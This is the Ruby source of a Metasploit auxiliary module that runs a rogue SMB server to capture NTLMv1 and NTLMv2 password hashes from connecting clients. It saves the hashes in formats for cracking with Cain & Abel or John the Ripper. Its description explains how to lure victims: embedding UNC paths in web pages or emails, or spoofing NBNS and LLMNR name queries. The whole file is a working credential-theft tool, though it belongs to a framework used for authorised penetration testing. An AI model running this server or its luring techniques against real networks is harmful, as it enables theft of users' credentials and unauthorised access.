##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HashCapture

  def initialize
    super({
      'Name' => 'Authentication Capture: SMB',
      'Description' => %q{
        This module provides a SMB service that can be used to capture the challenge-response
        password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.
        Responses sent by this service by default use a random 8 byte challenge string.
        A specific value (such as `1122334455667788`) can be set using the CHALLENGE option,
        allowing for easy cracking using Cain & Abel (NTLMv1) or John the Ripper
        (with jumbo patch).

        To exploit this, the target system must try to authenticate to this
        module. One way to force an SMB authentication attempt is by embedding
        a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When
        the victim views the web page or email, their system will
        automatically connect to the server specified in the UNC share (the IP
        address of the system running this module) and attempt to
        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to
        respond to queries for names the victim is already looking for.

        Documentation of the above spoofing methods can be found by running `info -d`.
      },
      'Author' => [
        'hdm',                 # Author of original module
        'Spencer McIntyre',    # Creator of RubySMB::Server
        'agalway-r7',          # Port of existing module to use RubySMB::Server
        'sjanusz-r7',          # Port of existing module to use RubySMB::Server
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture'
    })

    register_options(
      [
        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
        OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern. If unset a valid random challenge is used.' ], regex: /^([a-fA-F0-9]{16})$/),
        OptString.new('SMBDomain', [ true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  def start_service(opts = {})
    ntlm_provider = HashCaptureNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider

    super(opts)
  end

  def on_client_connect(client)
    print_good('Received SMB connection on Auth Capture Server!')
  end

  alias :run :exploit
end
